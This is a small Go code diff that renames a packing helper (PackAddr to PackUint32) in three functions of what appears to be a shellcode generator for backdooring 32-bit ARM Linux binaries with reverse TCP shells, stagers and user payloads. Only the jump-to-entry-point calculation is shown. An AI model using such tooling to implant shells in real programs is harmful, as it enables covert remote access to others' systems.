@@ -29,7 +29,7 @@ func reverse_tcp_shell_linux_arm_32(params api.Parameters) ([]byte, error) {
 
 	// JMP Address = (entrypoint - currentaddress -8)/4
 	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
-	if as, err := api.PackAddr(jmpAddr); err == nil {
+	if as, err := api.PackUint32(jmpAddr); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
@@ -91,7 +91,7 @@ func reverse_tcp_stager_linux_arm_32(params api.Parameters) ([]byte, error) {
 	shellcode1 += "\x00\x00\x00\x0a" // beq to shellcode
 	// JMP Address = (entrypoint - currentaddress -8)/4
 	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
-	if as, err := api.PackAddr(jmpAddr); err == nil {
+	if as, err := api.PackUint32(jmpAddr); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
@@ -140,7 +140,7 @@ func user_shellcode_linux_arm_32(params api.Parameters) ([]byte, error) {
 	shellcode1 += "\x00\x00\x00\x0a" // beq to shellcode
 	// JMP Address = (entrypoint - currentaddress -8)/4
 	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
-	if as, err := api.PackAddr(jmpAddr); err == nil {
+	if as, err := api.PackUint32(jmpAddr); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
